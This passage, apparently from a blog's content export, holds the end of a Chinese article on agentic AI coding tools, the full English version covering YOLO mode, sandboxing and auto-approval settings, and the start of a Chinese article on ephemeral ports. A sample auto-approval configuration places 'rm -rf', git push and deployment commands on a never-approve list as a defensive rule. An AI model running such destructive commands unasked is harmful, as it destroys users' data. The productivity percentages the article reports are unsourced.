1：从 IDE 集成工具开始 从直接集成到你的开发环境的工具开始。GitHub Copilot、Amazon CodeWhisperer 或 Tabnine 提供温和的介绍，你可以接受或拒绝代码建议。这建立了对 AI 协助的熟悉度，而不会让你不知所措。 步骤 2：尝试简单任务 从要求 AI 帮助处理简单任务开始： 编写实用函数 生成测试用例 解释不熟悉的代码 重构小代码部分 这建立了信心并帮助你理解 AI 的优势和限制。 步骤 3：升级到自主代理 一旦对建议感到舒适，探索具有自主能力的工具。尝试要求代理： 跨多个文件添加新功能 在保持测试的同时重构模块 调试失败的测试套件 观察代理如何计划和执行这些任务。 步骤 4：学习有效的提示 AI 输出的质量在很大程度上取决于你如何沟通。练习： 对需求具体 提供有关你项目的上下文 描述约束和偏好 在需要时要求解释 步骤 5：培养审查心态 始终批判性地审查 AI 生成的代码： 它是否满足需求？ 是否存在安全问题？ 它是否可维护且结构良好？ 它是否遵循你项目的惯例？ 将 AI 视为需要审查其工作的初级开发人员，而不是无误的神谕。 🎯 你的第一个代理式编码项目尝试这个适合初学者的练习： 选择一个简单的项目想法（例如，命令行待办事项列表） 在你的 IDE 中安装 AI 编码工具 用简单的语言向 AI 描述项目 让 AI 生成初始代码结构 审查和测试生成的代码 要求 AI 添加一个新功能 观察它如何修改现有代码以集成功能 这种实践经验将教会你比任何教程更多。 结论：拥抱 AI 驱动的未来 代理式编码的崛起代表的不仅仅是技术进步——这是软件创建方式的根本转变。从复制粘贴 ChatGPT 响应的早期到今天可以构建整个应用程序的自主代理，我们见证了一个在几年前似乎不可能的转变。 这种演变并没有削弱人类开发人员的角色；它提升了它。随着 AI 处理常规实现细节，开发人员被释放出来专注于人类最擅长的事情：创意问题解决、架构思考、理解用户需求和做出战略决策。未来属于能够有效地与 AI 代理协作的开发人员，利用它们的优势，同时提供机器无法复制的人类判断、创造力和伦理监督。 从复制粘贴到自主代理的旅程只是开始。随着 AI 继续演变，人类和机器贡献之间的界限将进一步模糊，创造我们今天几乎无法想象的新可能性。问题不是是否要拥抱代理式编码——而是你能多快适应这个新范式并将自己定位在这场革命的最前沿。 工具在这里。技术已经准备好了。唯一剩下的问题是：你准备好转变你构建软件的方式了吗？ 💭 最后的想法「预测未来的最好方法是发明它。」——Alan Kay 在代理式编码时代，我们不仅仅是预测软件开发的未来——我们正在积极创造它，一次一个 AI 辅助的提交。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"},{"name":"Agentic AI","slug":"Agentic-AI","permalink":"https://neo01.com/tags/Agentic-AI/"}],"lang":"zh-CN"},{"title":"The Rise of Agentic Coding: AI-Powered Software Engineering","slug":"2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering","date":"un66fin66","updated":"un00fin00","comments":true,"path":"2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/","permalink":"https://neo01.com/2025/09/The_Rise_of_Agentic_Coding_AI_Powered_Software_Engineering/","excerpt":"From copy-paste to autonomous agents - discover how AI is transforming software development. Explore YOLO mode, sandboxed environments, and the future where developers become solution architects.","text":"Remember when you first discovered ChatGPT could write code? You probably did what millions of developers did: copied your requirements, pasted them into the chat, and watched in amazement as working code appeared. Then came the debugging dance - copying error messages back to the AI, pasting the “fixed” code into your editor, only to repeat the cycle when new bugs emerged. That was just the beginning. What started as a simple copy-paste workflow has evolved into something far more powerful: agentic coding. These aren’t just smart autocomplete tools or helpful chatbots anymore. Today’s AI agents can read your entire codebase, understand your project structure, write and modify multiple files simultaneously, run tests, fix bugs, and even deploy applications - all without you lifting a finger. Imagine telling an AI “build me a todo app with user authentication” and returning an hour later to find a complete, tested, and deployed application. That’s not science fiction - it’s happening right now with tools that support “YOLO mode” (You Only Live Once), where AI agents work autonomously without asking for permission at every step. 💡 What is YOLO Mode?YOLO (You Only Live Once) mode allows AI agents to work autonomously for extended periods without asking for permission at every step. The agent makes decisions, writes code, runs tests, and fixes issues independently while you focus on other tasks. Think of it as putting your AI assistant on autopilot. From Copy-Paste to Autonomous Agents: The Journey The transformation began innocently enough. In late 2022, developers worldwide discovered they could describe their coding problems in plain English and receive working solutions. This was the birth of the copy-paste era - crude but revolutionary. Developers would copy requirements into ChatGPT, paste the generated code into their editors, then copy error messages back to the AI for debugging. It was a tedious dance, but it worked. The real breakthrough came when AI moved into our development environments. Instead of juggling browser tabs and text editors, tools like GitHub Copilot and Amazon CodeWhisperer brought AI directly into IDEs. This marked the suggestion era - AI could see your entire file, understand your coding style, and suggest completions that actually made sense in context. The copy-paste dance evolved into a more elegant waltz, with AI and developers working in harmony within the same workspace. Then came the game-changer: the autonomous agent era. These weren’t just suggestion engines anymore - they were digital colleagues capable of reading entire codebases, understanding project architecture, and making independent decisions. Modern tools can refactor authentication systems across dozens of files simultaneously, updating imports, fixing type definitions, and maintaining consistency throughout. They can browse documentation when stuck, run terminal commands to test their own code, and even deploy applications to production. timeline title Evolution of AI-Powered Coding 2022-2023 : Copy-Paste Era : Manual copying between browser and editor : Repetitive debugging cycles 2023-2024 : Suggestion Era : IDE-integrated AI assistants : Context-aware code completion : Real-time suggestions 2024-2025 : Autonomous Agent Era : Multi-file editing : Independent decision-making : YOLO mode automation This isn’t just about writing code faster - it’s about fundamentally redefining what it means to be a software developer. When AI handles the routine implementation details, developers transform from code typists into solution architects, focusing on creative problem-solving rather than syntax memorization. How Agentic Coding Actually Works To understand agentic coding, imagine having a highly skilled developer sitting next to you who can see your entire project, understand your goals, and work independently while you focus on bigger picture decisions. But instead of a human, it’s an AI system with several interconnected components working together. At its core, an agentic coding system operates through a continuous loop: Observe → Plan → Act → Reflect. The agent first observes your codebase, requirements, and current state. It then creates a plan of action, executes that plan by writing or modifying code, and reflects on the results to determine next steps. This cycle repeats until the task is complete or human intervention is needed. graph LR A([🔍 ObserveAnalyze codebase& requirements]) --> B([🎯 PlanCreate strategy& approach]) B --> C([⚡ ActWrite & modifycode]) C --> D([💭 ReflectEvaluate results& adjust]) D --> A style A fill:#e1f5ff,stroke:#0288d1,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px The magic happens through sophisticated context management. Unlike simple chatbots that forget previous conversations, agentic systems maintain persistent memory of your project structure, coding patterns, previous decisions, and even your personal preferences. When you ask an agent to “add user authentication,” it doesn’t just generate generic code - it analyzes your existing architecture, identifies the appropriate files to modify, understands your database schema, and implements authentication in a way that’s consistent with your project’s style. 🎬 Real-World ScenarioYou tell the agent: &quot;Add user login with email and password.&quot; The agent: Observes your existing database structure and finds a users table Plans to create login routes, authentication middleware, and password hashing Acts by modifying 5 files: routes, controllers, models, middleware, and tests Reflects by running tests, finding a missing import, and fixing it automatically All of this happens in minutes, without you touching a single line of code. What Makes a Great Agentic Coding Tool? Not all AI coding tools are created equal. Understanding what separates basic code generators from true agentic systems helps you choose the right tool for your needs. Let’s explore the essential capabilities and quality standards that define modern agentic coding platforms. Core Capabilities Multi-File Code Generation and Editing: The system must read, understand, and modify multiple files simultaneously while maintaining consistency across the entire codebase. This includes updating imports, fixing type definitions, and ensuring architectural coherence. Autonomous Task Execution: Beyond code generation, agents must execute terminal commands, run tests, install dependencies, and interact with external services. They should handle the complete development workflow, not just the coding portion. Context-Aware Decision Making: The system must understand project context, including existing patterns, architectural decisions, and coding standards. It should make decisions that align with the project’s established conventions rather than generating generic solutions. Error Detection and Self-Correction: When code fails to compile or tests break, the agent must diagnose issues, understand error messages, and implement fixes autonomously. This includes debugging complex multi-step problems that span multiple files. Integration with Development Tools: Seamless integration with IDEs, version control systems, package managers, and deployment pipelines. The agent should work within existing developer workflows rather than requiring entirely new processes. Quality Standards Performance and Responsiveness: Agents must provide near real-time feedback for simple tasks while handling complex multi-file operations within reasonable timeframes. Users expect immediate responses for code completions and quick turnaround for larger refactoring tasks. Reliability and Consistency: The system must produce consistent, high-quality code across sessions. An agent that generates different solutions for identical problems undermines developer confidence and project maintainability. Security and Privacy: Enterprise-grade security for code analysis, with options for on-premises deployment and strict data handling policies. Developers need assurance that proprietary code remains confidential and secure. ⚠️ Security ConsiderationsAI coding tools often require access to your source code and internal documentation. Before adopting any tool: Verify the vendor's data handling policies Check if on-premises deployment is available for sensitive projects Understand what data is sent to external servers Review your organization's security requirements Consider tools that process code locally when possible Scalability: The system must handle projects of varying sizes, from small scripts to enterprise applications with millions of lines of code, without degrading performance or accuracy. Customization and Adaptability: Flexible configuration options for coding standards, architectural preferences, and team-specific requirements. The agent should adapt to different programming languages, frameworks, and development methodologies. The Role of AI Models: Reasoning vs Instruction Models Not all AI models are created equal for coding tasks. Modern agentic coding tools often use different types of AI models for different stages of work, and understanding this helps you use these tools more effectively. Reasoning Models are designed for systematic problem-solving and planning. They excel at breaking down complex tasks into steps, understanding project architecture, and making strategic decisions. Think of them as the “architect” - they figure out what needs to be done and in what order. These models are slower but more thorough, making them perfect for the planning phase. Instruction Models (also called chat or completion models) are optimized for fast code generation and following specific directions. They’re excellent at understanding natural language requirements and quickly generating code based on clear instructions. Think of them as the “builder” - once they know what to build, they build it quickly. These models work best for the action phase where speed matters. 📊 Model Selection in PracticeSome advanced tools let you choose which model to use for different tasks: Plan Mode: Uses reasoning models to analyze your request and create a detailed implementation plan Act Mode: Uses instruction models to quickly generate code based on the plan This hybrid approach combines the strategic thinking of reasoning models with the speed of instruction models, giving you the best of both worlds. Advanced Features: Security and Control As agentic coding tools become more powerful and autonomous, advanced features for security and control have become essential. Let’s explore how modern tools protect your system while giving you fine-grained control over AI actions. Sandbox Environments: Safe Execution Zones When AI agents run terminal commands or execute code, they could potentially harm your system - whether accidentally or through malicious code generation. Sandbox environments solve this by creating isolated execution zones where AI can work without risking your main system. How Sandboxing Works: Think of a sandbox as a virtual playground where AI can build, test, and experiment without affecting anything outside. If the AI generates code that crashes, deletes files, or behaves unexpectedly, the damage stays contained within the sandbox. Docker-Based Sandboxes: Some tools use Docker containers as sandboxes. For example, Gemini CLI can spin up a Docker container where all AI-generated code runs. This provides strong isolation because: The container has its own filesystem separate from your computer Network access can be restricted or monitored Resource usage (CPU, memory) can be limited The entire environment can be reset instantly if something goes wrong Your actual project files remain untouched until you explicitly approve changes This approach is considered highly secure because even if AI generates malicious code, it can only affect the temporary container, not your actual development environment or personal files. graph TB A([👤 DeveloperGives instruction]) --> B([🤖 AI AgentGenerates code]) B --> C([🐳 Docker SandboxIsolated environment]) C --> D{✅ Tests Pass?} D -->|Yes| E([📋 Present resultsto developer]) D -->|No| B E --> F{DeveloperApproves?} F -->|Yes| G([💾 Apply toactual project]) F -->|No| H([❌ Discard changes]) style C fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#ffebee,stroke:#c62828,stroke-width:2px 🛡️ Why Sandboxing Matters for EnterprisesWithout sandboxing, an AI agent with terminal access could: Accidentally delete important files Install unwanted software Modify system configurations Consume excessive resources Execute code with security vulnerabilities For enterprise teams, tools like Gemini CLI and Vibe with Docker-based sandboxes provide the security isolation needed to safely deploy AI coding assistants across organizations. The sandbox ensures that even if AI makes mistakes or generates problematic code, your production systems and sensitive data remain protected. Fine-Grained Auto-Approval: Controlled Autonomy While YOLO mode sounds exciting, most developers want control over what AI can do automatically. Fine-grained auto-approval systems let you define exactly which actions AI can take without asking permission. Action-Level Control: Modern tools like Cline allow you to set approval rules for different types of actions: Always auto-approve: Reading files, searching code, analyzing structure Ask first: Writing or modifying files, installing packages Never auto-approve: Deleting files, running deployment commands, accessing external APIs This means you can let AI work autonomously on safe operations while maintaining oversight on potentially risky actions. ⚠️ Auto-Approval Safety FeatureCline includes a built-in safety mechanism that warns you when too many actions have been auto-approved in a session. This prevents &quot;approval fatigue&quot; where you might accidentally configure overly permissive settings. If you see this warning, it's a good time to review your auto-approval configuration and ensure you're not exposing your project to unnecessary risks. Example Workflow: You might configure your tool to: Auto-approve: Reading any file in your project Auto-approve: Running tests in the sandbox Ask permission: Modifying source code files Ask permission: Installing new dependencies Always block: Deleting files or folders With these settings, AI can analyze your entire codebase and run tests freely, but must ask before making actual changes. MCP Server Tool Auto-Approval Model Context Protocol (MCP) servers extend AI capabilities by providing specialized tools - like database access, API integrations, or custom workflows. Fine-grained control becomes even more important here. What is MCP? Think of MCP as a way to give AI agents access to specialized tools beyond basic coding. An MCP server might provide: Database query capabilities Access to your company’s internal APIs Integration with project management tools Custom business logic specific to your organization Per-Server Approval Settings: Advanced tools let you configure auto-approval separately for each MCP server: Documentation MCP Server: Auto-approve all actions (safe, read-only) Database MCP Server: Require approval for write operations, auto-approve reads Deployment MCP Server: Never auto-approve (too risky) Testing MCP Server: Auto-approve within sandbox only This granular control means you can safely enable powerful integrations without worrying about AI making unauthorized changes to critical systems. 🎯 Real-World Auto-Approval ConfigurationA typical safe configuration for a web development project: File Operations: ✅ Auto-approve: Read any file ✅ Auto-approve: Create/modify files in /tests directory ⚠️ Ask first: Modify files in /src directory ❌ Never approve: Delete files, modify .git directory Terminal Commands: ✅ Auto-approve: npm test, npm run lint ⚠️ Ask first: npm install, git commit ❌ Never approve: rm -rf, git push, deployment commands MCP Tools: ✅ Auto-approve: Documentation search, code analysis ⚠️ Ask first: Database queries, API calls ❌ Never approve: Production database access, payment processing Balancing Autonomy and Safety The key to effective agentic coding is finding the right balance between autonomy and control: Too Restrictive: If you require approval for every action, you lose the efficiency benefits of autonomous agents. You’ll spend more time clicking “approve” than actually developing. Too Permissive: If you auto-approve everything, you risk AI making mistakes that could break your project, compromise security, or cause data loss. Just Right: Configure auto-approval based on risk levels: High autonomy for read operations and analysis Moderate autonomy for test code and documentation Low autonomy for production code changes No autonomy for destructive operations or external integrations As you gain experience with your AI tools and build trust in their capabilities, you can gradually expand auto-approval settings to increase efficiency while maintaining safety. 🎓 Learning Path for Auto-ApprovalStart conservative and gradually expand: Week 1: Approve everything manually, learn what AI does Week 2: Auto-approve file reading and code analysis Week 3: Auto-approve test file modifications Week 4: Auto-approve safe terminal commands in sandbox Month 2+: Customize based on your comfort level and project needs This gradual approach builds confidence while maintaining safety. The AI-Powered Development Landscape The market for AI coding tools has exploded, with platforms offering various features and capabilities. While specific tools evolve rapidly, understanding the landscape helps you make informed choices. Major Players Comparison GitHub Copilot Strengths: Deep IDE integration, massive training data, enterprise features Weaknesses: Limited autonomy, requires human guidance Best for: Traditional pair programming enhancement Cursor Strengths: Native IDE with AI-first design, excellent UX, multi-file editing Weaknesses: Newer ecosystem, limited extensions Best for: Developers wanting AI-native coding environment Continue Strengths: Open source, customizable, works with any IDE Weaknesses: Requires more setup, less polished UX Best for: Developers wanting control and customization Cline (formerly Claude Dev) Strengths: Excellent reasoning, file system access, terminal integration Weaknesses: Limited to Claude models, VS Code only Best for: Complex refactoring and architectural changes AWS Q Developer Strengths: AWS integration, enterprise security, multi-language support Weaknesses: Primarily AWS-focused, newer to market Best for: AWS-centric development teams AWS Kiro Strengths: Spec-based development (AI generates specifications from requirements, then creates implementation plans), advanced reasoning Weaknesses: Early stage, limited availability, no YOLO mode or sandbox Best for: Specification-driven development, complex projects requiring detailed planning Gemini CLI Strengths: Google’s multimodal capabilities, free tier, Docker sandbox for enterprise-grade security Weaknesses: Command-line only, limited IDE integration Best for: Enterprise teams needing secure sandboxed execution, script automation, CLI-heavy workflows Vibe Strengths: Sandbox environment for safe execution, modern architecture Weaknesses: Newer to market, smaller community Best for: Teams prioritizing security and isolated execution environments Key Features Comparison Feature Copilot Cursor Continue Cline AWS Q Kiro Gemini CLI Vibe Memory Bank ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ Custom Rules ✅ ✅ ✅ ✅ ✅ ✅ ✅ ✅ MCP Servers ✅ ❌ ✅ ✅ ❌ ✅ ✅ ❓ YOLO Mode ❌ ✅ ❌ ✅ ❌ ❌ ✅ ❓ Sandbox ❌ ❌ ❌ ❌ ✅ ❌ ✅ ✅ Multi-Model ✅ ✅ ✅ ❌ ❌ ✅ ✅ ❓ Fine-Grained Auto-Approval ❌ ❌ ❌ ✅ ❌ ❓ ❓ ❓ Spec-Based Development ❌ ❌ ❌ ❌ ❌ ✅ ❌ ❌ ⚠️ Feature Comparison AccuracyThis comparison reflects capabilities at the time of writing, but the AI coding landscape evolves at breakneck speed. Features that are cutting-edge today may become standard tomorrow, and new capabilities emerge monthly. Tools frequently add features that were previously exclusive to competitors. Always check the latest documentation before making tool decisions, and expect this table to be partially outdated within months. Advanced Features Explained Memory Bank: Persistent context across sessions, learning from your codebase patterns and remembering your preferences. Custom Rules: Project-specific coding standards and preferences that guide AI behavior to match your team’s conventions. MCP Servers: Model Context Protocol for extending capabilities with external tools like databases, APIs, and custom workflows. YOLO Mode: Autonomous execution without confirmation prompts, allowing AI to work independently for extended periods. Sandbox: Isolated environments (often Docker-based) for safe code execution and testing without risking your main system. Multi-Model: Ability to switch between different AI models (reasoning vs instruction models) for different tasks. Fine-Grained Auto-Approval: Granular control over which actions AI can perform automatically, including per-MCP-server approval settings. Tools like Cline provide warnings when too many actions are auto-approved, helping prevent over-permissive configurations. Spec-Based Development: AI first generates detailed specifications from natural language requirements, then creates implementation plans based on those specs. This two-phase approach ensures better alignment between requirements and implementation, reducing misunderstandings and rework. Which Tool Fits Your Needs? For Beginners Recommendation: GitHub Copilot or Cursor Gentle learning curve, excellent documentation, strong community support For Experienced Developers Recommendation: Continue or Cline Maximum control and customization, advanced agentic capabilities, open source flexibility For Enterprise Teams Recommendation: Gemini CLI, AWS Q Developer, or GitHub Copilot Enterprise Gemini CLI offers Docker-based sandbox for maximum security isolation AWS Q and Copilot provide enterprise security, compliance, team collaboration, audit trails and governance For Specification-Driven Projects Recommendation: AWS Kiro Spec-based development ensures requirements are properly understood before implementation Ideal for complex projects where clear specifications reduce costly rework For Experimental Projects Recommendation: Cursor or Vibe Cutting-edge agentic features, autonomous development capabilities Vibe offers sandbox for safe experimentation 📝 Note on Tool EvolutionThe AI coding tool landscape changes rapidly. New features appear monthly, and today's limitations often become tomorrow's capabilities. Focus on understanding the core concepts rather than specific tool features, as these principles remain constant even as tools evolve. Transforming the Software Development Life Cycle AI isn’t just changing how we write code - it’s revolutionizing every stage of software development. The traditional Software Development Life Cycle (SDLC) is being transformed from a linear process into a continuously optimizing system where AI provides intelligence, automation, and feedback at each stage. Requirements Phase AI tools can now parse stakeholder conversations and documents using natural language processing, detecting ambiguities, conflicts, and missing requirements. They can automatically generate user stories with traceability links, helping teams move from vague ideas to concrete specifications faster than ever before. Spec-Based Development: Tools like AWS Kiro take this further by generating formal specifications from natural language requirements. The AI first creates a detailed spec document that captures all requirements, constraints, and acceptance criteria. Only after the spec is reviewed and approved does it generate an implementation plan. This two-phase approach offers significant advantages: Reduced Misunderstandings: Specifications are reviewed before any code is written, catching requirement gaps early Better Alignment: Stakeholders can validate the spec without needing to understand code Cost Savings: Fixing specification errors is far cheaper than refactoring implemented code Traceability: Every code change can be traced back to specific requirements in the spec Documentation: The spec serves as living documentation that stays synchronized with implementation Design Phase Pattern mining and constraint reasoning allow AI to propose architectures, estimate scalability and costs, and surface security concerns early in the process. Instead of spending weeks on design documents, teams can explore multiple architectural options in hours. Implementation Phase This is where agentic coding truly shines. Generative coding, semantic search, auto-refactoring, and policy-enforced code assistants accelerate delivery while enforcing style guides, licensing compliance, security best practices, and performance optimizations automatically. Testing Phase AI prioritizes test cases by risk and impact, generates synthetic test data, performs mutation testing to find gaps in coverage, and even triages flaky tests. This means better test coverage with less manual effort. Deployment Phase Predictive analytics tune deployment strategies, set rollback triggers, and optimize capacity and costs. Infrastructure-as-code is automatically checked for configuration drift and compliance issues before deployment. Operations Phase AI operations (AIOps) correlate logs, traces, and metrics to reduce mean time to recovery (MTTR) and protect service level objectives (SLOs). When issues occur, AI can often diagnose and suggest fixes faster than human operators. graph TB A([📋 RequirementsNLP parsing & user stories]) --> B([🏗️ DesignArchitecture proposals]) B --> C([💻 ImplementationAgentic coding]) C --> D([🧪 TestingAI-prioritized test cases]) D --> E([🚀 DeploymentPredictive analytics]) E --> F([⚙️ OperationsAIOps monitoring]) F -.Feedback.-> A style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#fce4ec,stroke:#c2185b,stroke-width:2px style F fill:#e0f2f1,stroke:#00796b,stroke-width:2px Benefits and Advantages The integration of AI into software development delivers tangible benefits that go beyond mere productivity gains: Efficiency and Speed: Automating repetitive coding and testing tasks can reduce development timelines by 30-50%, allowing teams to ship features faster and respond to market demands more quickly. Enhanced Collaboration: Real-time AI assistance bridges gaps between technical and non-technical team members. Product managers can describe features in plain language, and AI translates these into technical specifications developers can implement. Improved Code Quality: AI-powered code review and debugging reduce human error and enhance maintainability. Automated security scanning catches vulnerabilities before they reach production. Adaptability: Modern platforms support diverse languages and frameworks, scaling from small scripts to enterprise applications with millions of lines of code. Learning and Onboarding: AI assistants support new developers with contextual help and explanations, dramatically reducing the time needed to become productive on a new codebase. Cost Savings: Streamlining workflows and reducing manual labor can decrease operational costs while improving output quality. ✨ Real ImpactOrganizations adopting agentic coding tools report: 40-60% reduction in time spent on routine coding tasks 30-50% faster onboarding for new team members 25-40% reduction in bugs reaching production Developers spending more time on creative problem-solving and less on repetitive tasks Challenges and Considerations Despite impressive benefits, AI software engineering platforms come with challenges that organizations must address thoughtfully. Data Security and Privacy: AI tools often require access to source code and internal documentation. Ensuring these assets remain protected is paramount, especially for organizations handling sensitive data or intellectual property. Reliability and Trust: While AI can automate many tasks, human oversight remains necessary to validate suggestions and avoid introducing errors or biases. Blindly accepting AI-generated code can lead to subtle bugs or security vulnerabilities. Integration Complexity: Seamlessly incorporating AI platforms into existing workflows may require customization, training, and process changes. Teams need time to adapt and learn effective collaboration patterns with AI agents. Ethical Considerations: The use of AI-generated code raises questions about originality, licensing, and intellectual property. Who owns code written by AI? What happens if AI generates code similar to copyrighted material? Skill Gaps: Teams may need to upskill to fully leverage advanced AI capabilities. Understanding how to effectively prompt, guide, and validate AI agents becomes a new essential skill. Dependence on Vendors: Relying on third-party platforms introduces risks if providers change terms, pricing, or availability. Organizations should consider vendor lock-in and have contingency plans. ⚠️ Common Pitfalls to Avoid Over-reliance: Don't skip code reviews just because AI wrote the code Security blindness: Always scan AI-generated code for vulnerabilities Context neglect: Ensure AI understands your specific requirements and constraints Testing shortcuts: AI-generated code still needs comprehensive testing Skill atrophy: Maintain fundamental coding skills even as AI handles routine tasks The Future of AI-Led Software Engineering The trajectory of AI in software development points toward increasingly autonomous and intelligent systems. Here are emerging trends that will shape the next generation of development tools: Autonomous SDLC Loops: Future systems will orchestrate multiple specialized agents that auto-generate user stories, code, tests, and deployment strategies. Humans will approve high-level rationale and strategic decisions rather than reviewing every code change. Multi-Agent Development Ecosystems: Specialized agents for requirements, architecture, testing, and security will negotiate trade-offs collaboratively, producing explainable decision matrices that help teams understand the implications of different choices. Intent-Centric Development: Developers will describe what they want to achieve in natural language, and AI will automatically synchronize this intent across user stories, API specifications, policy-as-code, test cases, and monitoring configurations - eliminating the drift between documentation and implementation. Self-Healing and Self-Optimizing Systems: AI agents will detect potential issues before they become problems, synthesize patches, inject protective measures, and verify system health automatically - moving from reactive debugging to proactive system maintenance. Continuous Trust and Compliance: Parallel pipelines will continuously score code for security, fairness, robustness, and supply chain integrity, with real-time badges that gate production deployments based on quality thresholds. Sustainable Engineering: AI will optimize for environmental impact, scheduling resource-intensive tasks during low-carbon energy windows and suggesting code optimizations that reduce energy consumption while maintaining performance. 🔮 Preparing for the FutureTo stay ahead in this rapidly evolving landscape: Embrace continuous learning: AI tools evolve monthly; stay curious and experiment Focus on problem-solving: As AI handles implementation, your value shifts to understanding problems deeply Develop AI collaboration skills: Learn to effectively prompt, guide, and validate AI agents Maintain fundamentals: Strong coding fundamentals help you evaluate and improve AI-generated code Think architecturally: Your role increasingly becomes designing systems rather than writing every line Getting Started with Agentic Coding Ready to experience agentic coding for yourself? Here’s a practical roadmap for beginners: 🔒 Security FirstBefore diving in, ensure you: Understand your tool's data handling policies Configure appropriate auto-approval settings (start restrictive) Use sandbox environments when available Never share sensitive credentials or API keys with AI tools Review all AI-generated code before committing to version control Step 1: Start with IDE-Integrated Tools Begin with tools that integrate directly into your development environment. GitHub Copilot, Amazon CodeWhisperer, or Tabnine offer gentle introductions with code suggestions that you can accept or reject. This builds familiarity with AI assistance without overwhelming you. Step 2: Experiment with Simple Tasks Start by asking AI to help with straightforward tasks: Writing utility functions Generating test cases Explaining unfamiliar code Refactoring small code sections This builds confidence and helps you understand AI’s strengths and limitations. Step 3: Graduate to Autonomous Agents Once comfortable with suggestions, explore tools with autonomous capabilities. Try asking an agent to: Add a new feature across multiple files Refactor a module while maintaining tests Debug a failing test suite Observe how the agent plans and executes these tasks. Step 4: Learn Effective Prompting The quality of AI output depends heavily on how you communicate. Practice: Being specific about requirements Providing context about your project Describing constraints and preferences Asking for explanations when needed Step 5: Develop a Review Mindset Always review AI-generated code critically: Does it meet the requirements? Are there security concerns? Is it maintainable and well-structured? Does it follow your project’s conventions? Treat AI as a junior developer whose work needs review, not as an infallible oracle. 🎯 Your First Agentic Coding ProjectTry this beginner-friendly exercise: Choose a simple project idea (e.g., a command-line todo list) Install an AI coding tool in your IDE Describe the project to the AI in plain language Let the AI generate the initial code structure Review and test the generated code Ask the AI to add one new feature Observe how it modifies existing code to integrate the feature This hands-on experience will teach you more than any tutorial. Conclusion: Embracing the AI-Powered Future The rise of agentic coding represents more than a technological advancement - it’s a fundamental shift in how software is created. From the early days of copy-pasting ChatGPT responses to today’s autonomous agents that can build entire applications, we’ve witnessed a transformation that would have seemed impossible just a few years ago. This evolution doesn’t diminish the role of human developers; it elevates it. As AI handles routine implementation details, developers are freed to focus on what humans do best: creative problem-solving, architectural thinking, understanding user needs, and making strategic decisions. The future belongs to developers who can effectively collaborate with AI agents, leveraging their strengths while providing the human judgment, creativity, and ethical oversight that machines cannot replicate. The journey from copy-paste to autonomous agents is just the beginning. As AI continues to evolve, the boundary between human and machine contributions will blur further, creating new possibilities we can barely imagine today. The question isn’t whether to embrace agentic coding - it’s how quickly you can adapt to this new paradigm and position yourself at the forefront of this revolution. The tools are here. The technology is ready. The only question remaining is: are you ready to transform how you build software? 💭 Final Thought&quot;The best way to predict the future is to invent it.&quot; - Alan Kay In the age of agentic coding, we're not just predicting the future of software development - we're actively creating it, one AI-assisted commit at a time.","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"},{"name":"Agentic AI","slug":"Agentic-AI","permalink":"https://neo01.com/tags/Agentic-AI/"}]},{"title":"理解临时端口 Part 2：为什么服务器应用程序应避免使用动态端口","slug":"2025/08/Understanding_Ephemeral_Ports_Part2-zh-CN","date":"un00fin00","updated":"un22fin22","comments":true,"path":"/zh-CN/2025/08/Understanding_Ephemeral_Ports_Part2/","permalink":"https://neo01.com/zh-CN/2025/08/Understanding_Ephemeral_Ports_Part2/","excerpt":"探讨为什么 RPC 服务和 SQL Server 命名实例不应使用临时端口，并学习如何配置静态端口以建立可靠且安全的服务器应用程序。","text":"在 Part 1 中，我们探讨了临时端口如何从客户端角度运作——当应用程序发起对外连接时，操作系统会自动分配的临时端口。这对客户端来说运作得很完美，因为它们不需要被发现；它们确切知道要连接到哪个服务器和端口。 但当服务器应用程序在临时端口范围内使用动态端口时会发生什么？这会产生一个根本问题：客户端无法找到服务。如果你的数据库服务器今天在端口 54321 上启动，明天在端口 49876 上启动，客户端如何知道要连接到哪里？ 这就是服务器应用程序动态端口分配的挑战，在 RPC（远程过程调用）系统和数据库命名实例中特别常见。在本文中，我们将探讨为什么这种方法会造成问题，以及如何通过静态端口配置来解决它们。 RPC 挑战：当临时端口不适用时 远程过程调用（RPC）服务在临时端口的世界中呈现出独特的挑战。与典型的客户端-服务器应用程序不同（客户端使用临时端口，服务器监听众所周知的端口），传统的 RPC 系统通常会动态分配端口给服务——这会产生发现问题。 为什么 RPC 服务不应使用临时端口 RPC 服务需要可被发现。当客户端想要调用远程过程时，它需要知道服务正在监听哪个端口。如果服务使用每次重新启动都会改变的临时端口，客户端就无法找到它。 传统 RPC 问题： RPC 服务启动并绑定到随机临时端口（例如 54321） 客户端想要连接但不知道要使用哪个端口 客户端必须查询端口映射器/端点映射器服务来发现端口 这增加了复杂性、延迟和潜在的故障点 sequenceDiagram participant Client as 客户端 participant PortMapper as 端口映射器(端口 111) participant RPC as RPC 服务(端口 ???) Note over RPC: 在随机临时端口 54321 上启动 RPC->>PortMapper: 在端口 54321上注册服务 Client->>PortMapper: 服务 X在哪个端口？ PortMapper->>Client: 端口 54321 Client->>RPC: 连接到 54321 Note over Client,RPC: ❌ 复杂、脆弱、防火墙不友好 服务器应用程序使用动态端口的问题 1. 防火墙配置噩梦 你必须在防火墙中打开整个临时端口范围（可能超过 16,000 个端口），造成巨大的安全暴露。 2. 重新启动时端口会改变 每次服务重新启动时，它都会获得不同的端口。连接字符串、防火墙规则和监控工具必须动态适应。 3. 负载均衡器复杂性 